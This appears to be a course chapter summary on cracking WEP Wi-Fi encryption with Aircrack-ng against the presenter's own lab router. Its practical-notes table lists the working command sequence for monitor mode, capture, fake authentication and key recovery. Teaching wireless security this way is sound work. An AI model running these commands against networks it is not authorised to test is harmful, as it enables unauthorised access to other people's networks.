## About this chapter

Chapter 68 demonstrates the classic WEP attack with Aircrack-ng in a lab. It reviews why WEP is broken, puts the adapter into monitor mode with airmon-ng, scans for WEP networks with airodump-ng, collects IVs, uses fake authentication and injection with aireplay-ng, cracks the key, and verifies it. The demo uses the presenter's own router.

- Why WEP was deprecated and replaced

## Important concepts

### A design flaw, not a weak password

WEP's small IV space and weak integrity checks allow an attacker to recover the key from enough captured traffic. Changing the WEP password to something long does not fix the underlying protocol.

### Monitor mode and injection

Monitor mode lets the adapter capture all frames on a channel, not just those addressed to it. Injection lets the tester send crafted frames, which speeds up IV collection. Both require hardware and drivers that support them.

## Practical notes

The demonstration uses the presenter's own WEP-configured router in an isolated lab. Replace interface and BSSID values with your lab equipment.

| Command | What it does |
| --- | --- |
| `sudo airmon-ng start wlan0` | Enable monitor mode on the wireless adapter. |
| `sudo airodump-ng wlan0mon` | Scan nearby networks and note the target BSSID and channel. |
| `sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep wlan0mon` | Capture traffic from the target network. |
| `sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon` | Associate with the lab access point. |
| `sudo aircrack-ng wep-01.cap` | Attempt to recover the WEP key from the capture. |

Commands are shown for study. Run them only in your own lab, read the manual page (`man <tool>`) first, and check every option before executing anything.

## FAQ

### Why is WEP so easy to crack?

Its initialization vectors are too short and reused, and its integrity check is weak, so enough traffic reveals the key.

### Does my adapter support monitor mode?

It depends on the chipset and driver. Internal laptop cards often do not; adapters with supported Atheros or Realtek chipsets are commonly used.
